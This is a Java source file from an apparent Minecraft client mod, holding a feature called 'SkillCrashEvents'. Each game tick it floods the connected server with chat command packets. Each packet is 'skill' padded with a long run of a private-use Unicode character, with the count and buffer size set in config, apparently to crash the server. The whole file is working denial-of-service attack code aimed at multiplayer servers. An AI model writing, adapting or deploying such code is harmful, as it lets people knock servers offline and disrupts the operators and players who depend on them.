package com.tricrotism.features.crash.skill;

import com.tricrotism.Main;
import com.tricrotism.config.Config;
import com.tricrotism.eventbus.EventHandler;
import com.tricrotism.events.game.GameQuitEvent;
import com.tricrotism.events.world.TickEvent;
import net.minecraft.client.Minecraft;
import net.minecraft.client.multiplayer.ClientPacketListener;
import net.minecraft.network.protocol.game.ServerboundChatCommandPacket;

public class SkillCrashEvents {

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (!Main.getConfig().skillCrash) return;
        
        Minecraft mc = Minecraft.getInstance();

        if (mc.player == null || mc.getConnection() == null) return;

        Main.LOGGER.info("Skill crash activated! Sending {} packets with buffer size {}", 
                          Main.getConfig().amountOfPacketsPerTick, 
                          Main.getConfig().skillCrashBuffer);

        ClientPacketListener handler = mc.getConnection();
        String spam = "skill " + "\uE400".repeat(Main.getConfig().skillCrashBuffer);

        for (int i = 0; i < Main.getConfig().amountOfPacketsPerTick; i++) {
            handler.send(new ServerboundChatCommandPacket(spam));
        }
    }

    @EventHandler
    private void onGameLeft(GameQuitEvent event) {
        if (Main.getConfig().skillCrash) {
            Main.getConfig().skillCrash = false;
            Config.write();
        }
    }
}